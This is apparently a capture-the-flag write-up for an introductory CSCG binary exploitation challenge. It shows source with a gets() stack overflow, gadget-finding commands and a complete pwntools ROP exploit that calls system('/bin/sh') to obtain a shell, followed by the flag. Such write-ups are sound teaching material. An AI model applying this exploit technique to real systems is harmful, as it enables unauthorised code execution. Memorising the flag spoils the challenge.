---
difficulty: Intro
author: LOCALO
---

### Description
This used to be a simple pwn challenge. But someone patched it and the win function doesn't print the flag anymore, can you still get it? If this is the first time doing binary exploitation, this challenge might feel a bit overwhelming. But don't worry, I have attached the first challenge from two years ago and a README for it. If you solve that one, you should be able to solve this one as well with a bit of tinkering. If you feel stuck, feel free to ask for help in the discord server.
### Walkthrough
We are given a binary `intro-pwn` and it's code `intro-pwn.c`. Let's look at the code.
```c
void win()
{
    system("echo no cat /flag for you");
}

void vuln() {
    char name[16];
    printf("What is your name?\n");
    gets(name);
    printf("Hello %s!\nI have a present for you: %d\n", name, 0xc35f);
}

int main(int argc, char **argv)
{
    (void)argc;
    (void)argv;

	ignore_me_init_buffering();

    vuln();
    return 0;
}
```
The first thing that i noticed here is that there is a function called `win()` and it's never called. There is also the function `gets(name);` which is unsafe because it does not check the length of input, making it vulnerable to a buffer overflow.
Let’s inspect the binary for security protections:
```js
file ./intro-pwn  
checksec ./intro-pwn
```
As a result now we know that it's a 64-bit ELF file and it has NX enabled, which means that we 
can't inject and execute shellcode directly. Instead, we must use ROP to exploit the binary.
```c
char name[16];
```
Since `name` is allocated 16 bytes, but function calls involve stack alignment, the return address is 16 + 8 = 24 bytes away.
There's no `/bin/sh` string in the binary, so we first write one ourselves into the writable `.data` section using `gets()` again, then call `system()` on it.
We need a **pop rdi; ret** gadget to control the argument to `system()`. And then, we locate useful functions:
```bash
ROPgadget --binary ./intro-pwn | grep "pop rdi"   # 0x401205 : pop rdi ; ret
objdump -d ./intro-pwn | grep gets@plt            # 0x401060
objdump -d ./intro-pwn | grep system@plt          # 0x401040
readelf -S ./intro-pwn | grep .data               # 0x404028
```
### Exploit
```python
from pwn import *  
  
io = process(["ncat", "--ssl-verify", "f43bc95a0dfaf7fe9b382c62-1024-intro-pwn-1.challenge.cscg.live", "1337"])  
  
pop_rdi     = 0x401205
system_addr = 0x401040
data_addr   = 0x404028
gets_addr   = 0x401060

payload = b"A" * 24    
  
payload += p64(pop_rdi)
payload += p64(data_addr)
payload += p64(gets_addr)

payload += p64(pop_rdi)
payload += p64(data_addr)  
payload += p64(system_addr)

io.sendline(payload)  
io.sendline(b"/bin/sh")
io.interactive()
```
And now we have a shell, and we can easily `cat` the flag.
### Flag
```
CSCG{15_7h15_R0P??}
```